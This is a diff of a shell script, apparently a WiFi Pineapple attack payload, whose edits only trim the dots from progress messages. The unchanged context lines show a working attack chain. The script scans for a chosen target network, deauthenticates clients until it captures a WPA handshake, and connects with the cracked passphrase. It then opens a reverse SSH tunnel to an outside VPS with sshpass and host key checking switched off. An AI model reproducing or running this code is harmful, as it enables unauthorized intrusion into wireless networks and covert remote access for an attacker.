@@ -17,7 +17,7 @@ TARGETSSID="$(TEXT_PICKER 'Enter target network SSID' '')"
     sleep 1.5
 
 # Scanning for target network:
-spinner1=$(START_SPINNER "Scanning for $TARGETSSID..")
+spinner1=$(START_SPINNER "Scanning for $TARGETSSID")
     sleep 60
     TARGETMAC=$(_pineap RECON ISEARCH "$TARGETSSID" | awk '{print $1}' | head -n 1)
 STOP_SPINNER "${spinner1}"
@@ -53,7 +53,7 @@ else
     while [ -z "$PCAP" ]; do
         LOG red "Handshake not found!"
         sleep 1.5
-        spinner2=$(START_SPINNER "Deauthing $TARGETSSID and re-checking..")
+        spinner2=$(START_SPINNER "Deauthing $TARGETSSID and re-checking")
         DEAUTHTARG
         sleep 60
         PCAP=$(find /root/loot/handshakes -name "*$CLEANMAC*_handshake.22000" | head -n 1)
@@ -109,7 +109,7 @@ LOG green "$MAPSSID shutdown complete!"
 sleep 1.5
 
 # Get on network:
-spinner3=$(START_SPINNER "Connecting to $TARGETSSID..")
+spinner3=$(START_SPINNER "Connecting to $TARGETSSID")
     WIFI_CONNECT wlan0cli "$TARGETSSID" psk2 "$TARGETPASS" ANY
     LANCONNECTED="false"
     for i in {1..12}; do
@@ -198,7 +198,7 @@ fi
 sleep 1
 
 # Establish reverse SSH tunnel:
-spinner4=$(START_SPINNER "Establishing SSH tunnel..")
+spinner4=$(START_SPINNER "Establishing SSH tunnel")
     ESTABTUNNEL() {
         (/mmc/usr/bin/sshpass -p "$SSHPW" ssh -o "StrictHostKeyChecking=no" -o "ConnectTimeout=15" -N -R 127.0.0.1:2222:localhost:22 root@"$VPSIP" &)
     }
